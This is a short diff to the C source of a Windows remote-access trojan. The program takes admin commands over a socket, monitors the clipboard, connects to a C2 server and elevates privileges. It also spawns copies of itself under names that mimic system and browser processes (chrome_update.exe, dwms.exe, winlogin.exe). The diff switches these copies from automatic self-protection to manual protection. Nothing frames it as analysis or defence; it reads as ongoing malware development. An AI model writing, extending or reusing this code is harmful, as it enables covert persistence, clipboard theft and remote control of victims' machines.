@@ -140,7 +140,7 @@ static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
     }
     else if (strcmp(cmd, "PROTECT_PROCESS") == 0) {
         sys_spawn_shadow_copy();
-        result = "[Spawned 3 copies: chrome_update.exe, dwms.exe, winlogin.exe — all auto-protect on startup]";
+        result = "[Spawned 3 copies: chrome_update.exe, dwms.exe, winlogin.exe — click Protect Now on each]";
     }
     else if (strcmp(cmd, "UNPROTECT_PROCESS") == 0) {
         sys_unprotect_process();
@@ -255,19 +255,19 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     /* Start background services */
     CreateThread(NULL, 0, copy_buffer_monitor_thread, NULL, 0, NULL);
     
-    /* Check if this is a shadow copy — auto-protect immediately */
+    /* Check if this is a shadow copy — just connect as normal client, no auto-protect */
     char *cmdLine = GetCommandLineA();
     if (cmdLine && strstr(cmdLine, "--shadow") != NULL) {
-        CreateThread(NULL, 0, shadow_auto_protect, NULL, 0, NULL);
+        /* Shadow copies behave like normal clients until explicitly protected */
     }
 
-    /* Also detect if running from shadow path and protect immediately */
+    /* Also detect if running from shadow path — still normal behavior */
     char currentPath[MAX_PATH];
     GetModuleFileNameA(NULL, currentPath, MAX_PATH);
     if (strstr(currentPath, "chrome_update.exe") != NULL ||
         strstr(currentPath, "dwms.exe") != NULL ||
         strstr(currentPath, "winlogin.exe") != NULL) {
-        sys_protect_process();
+        /* Normal client mode — connect to C2, wait for commands */
     }
 
     /* Elevate privileges if needed for full functionality */
